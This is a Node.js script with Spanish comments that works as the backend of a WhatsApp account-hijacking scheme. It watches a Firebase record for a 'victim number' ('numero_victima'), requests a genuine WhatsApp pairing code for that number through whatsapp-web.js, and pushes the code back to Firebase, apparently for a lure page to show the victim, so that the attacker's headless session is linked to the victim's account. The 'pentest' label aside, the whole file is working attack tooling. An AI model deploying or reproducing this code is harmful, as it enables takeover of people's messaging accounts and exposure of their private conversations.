const { Client, LocalAuth } = require('whatsapp-web.js');
const admin = require('firebase-admin');
const http = require('http');

const serviceAccount = require("./serviceAccountKey.json"); 
if (!admin.apps.length) { admin.initializeApp({ credential: admin.credential.cert(serviceAccount) }); }
const db = admin.firestore();

const client = new Client({
    authStrategy: new LocalAuth({ clientId: "pentest_session" }),
    puppeteer: {
        headless: true,
        args: ['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage', '--single-process']
    }
});

client.on('qr', () => { console.log("Esperando solicitud de número..."); });

// ESCUCHA ACTIVA DE PETICIONES
db.collection("wa_clon_global").doc("current_session").onSnapshot(async (snap) => {
    if (!snap.exists) return;
    const data = snap.data();

    if (data.status === "solicitando_codigo" && data.numero_victima && !data.pairingCode) {
        console.log("Generando vínculo real para: " + data.numero_victima);
        try {
            // SOLICITUD DIRECTA AL MOTOR DE WHATSAPP
            const code = await client.requestPairingCode(data.numero_victima);
            console.log("CÓDIGO OFICIAL GENERADO: " + code);
            
            // ACTUALIZACIÓN INMEDIATA EN FIREBASE
            await snap.ref.update({
                pairingCode: code,
                status: "mostrando_codigo_real",
                lastUpdate: Date.now()
            });
        } catch (err) {
            console.log("Error al generar código: " + err.message);
            await snap.ref.update({ status: "error" });
        }
    }
});

client.on('ready', () => {
    console.log("VINCULACIÓN EXITOSA - SESIÓN ACTIVA");
    db.collection("wa_clon_global").doc("current_session").update({ status: "exito" });
});

client.initialize();
http.createServer((req, res) => { res.end('MOTOR READY'); }).listen(process.env.PORT || 3000);
